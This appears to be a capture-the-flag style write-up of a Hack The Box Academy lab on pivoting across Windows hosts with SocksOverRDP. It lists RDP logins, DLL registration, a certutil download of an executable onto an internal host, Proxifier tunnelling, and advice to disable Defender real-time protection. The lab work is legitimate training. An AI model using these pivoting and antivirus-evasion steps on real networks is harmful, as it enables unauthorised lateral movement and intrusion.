
# HTB Academy - SocksOverRDP Pivoting Lab

**Author:** Don Trabajo  
**Platform:** Hack The Box Academy  
**Topic:** RDP and SOCKS5 Pivoting with SocksOverRDP  
**Level:** Medium  
**Category:** Network Pivoting / Tunneling

---

## 🧠 Objective

Pivot through multiple Windows machines using RDP tunneling with the **SocksOverRDP** tool. Ultimately retrieve `flag.txt` from the final target at `172.16.6.155`, user: `jason`.

---

## 🗺️ Network Topology

```
Kali (10.10.14.247)
   |
   |  <- VPN Tunnel ->
   |
Pivot Machine (10.129.42.198 / 172.16.5.150)
   |
   | <- RDP Connection + Plugin ->
   |
Victor Machine (172.16.5.19 / 172.16.6.19)
   |
   | <- Internal RDP Pivot via SocksOverRDP ->
   |
Target Machine (172.16.6.155)
```

---

## 🔑 Credentials

| Machine       | Username     | Password               |
|---------------|--------------|------------------------|
| Pivot Box     | htb-student  | REDACTED_PASSWORD     |
| Victor (172.16.5.19) | victor       | REDACTED_PASSWORD               |
| Target (172.16.6.155) | jason        | REDACTED_PASSWORD      |

---

## ⚙️ Steps

### 1. 🖥️ RDP into Pivot Box
```bash
xfreerdp /v:10.129.42.198 /u:htb-student /p:REDACTED_PASSWORD
```

### 2. 🔄 Transfer and Register Plugin
Transfer the `SocksOverRDP-x64` plugin to the **pivot** and **register the DLL**.

```cmd
regsvr32 SocksOverRDP-Plugin.dll
```

✔️ Disable real-time protection temporarily if the DLL is being auto-deleted.

### 3. 📦 Transfer Server to Victor Machine
Transfer `SocksOverRDP-Server.exe` to **Victor's desktop**. If Python is installed on the pivot:

```bash
# On pivot
python -m http.server 8080

# On Victor (CMD)
certutil -urlcache -split -f http://<pivot-ip>:8080/SocksOverRDP-Server.exe SocksOverRDP-Server.exe
```

If not, use Proxifier or `smbserver.py` as a transfer method.

### 4. 🧪 Launch Server on Victor
Run `SocksOverRDP-Server.exe` as **Administrator**. Look for:
```
[+] Channel opened over RDP
```

> ⚠️ Note: It may not show `listening on 127.0.0.1:1080`—this is expected. It’s being tunneled via RDP.

### 5. 🛠️ Configure Proxifier on Pivot
- Add Proxy Server:
  - IP: `127.0.0.1`
  - Port: `1080`
  - Type: SOCKS5
- Set up rule to tunnel `mstsc.exe` through the proxy

### 6. 🔌 RDP into Final Target
Use `mstsc.exe` on pivot:
```cmd
mstsc.exe
```
- Connect to: `172.16.6.155`
- User: `jason`
- Password: `REDACTED_PASSWORD`

✔️ You’re now RDP’d through **2 levels of pivoting** via SocksOverRDP.

---

## 📁 Flag Path

Navigate to Jason's desktop and read `flag.txt`.

---

## 🧠 Lessons Learned

- DLLs on Windows can be silently deleted by Defender—disable RTP as needed.
- SocksOverRDP requires **plugin registered on the client** and **server launched on the RDP target**.
- Proxifier is a lightweight and effective way to redirect tools through SOCKS5 tunnels.
- Tunneling RDP over RDP is very much possible and even stealthy if done right.

---

## 🧪 Commands Cheat Sheet

```cmd
# Check if SocksOverRDP is running on Victor
tasklist | findstr server.exe

# Check listener
netstat -an | findstr 1080
```

---

## 📸 Screenshots

_Add any screenshots or terminal logs here if you're sharing publicly._

---

## 📚 References

- [SocksOverRDP GitHub](https://github.com/nccgroup/SocksOverRDP)
- HTB Academy Module: "Pivoting, Tunneling, and Port Forwarding"

---

✍️ _Don Trabajo strikes again with another lab cracked and documented. Respect the tunnel!_

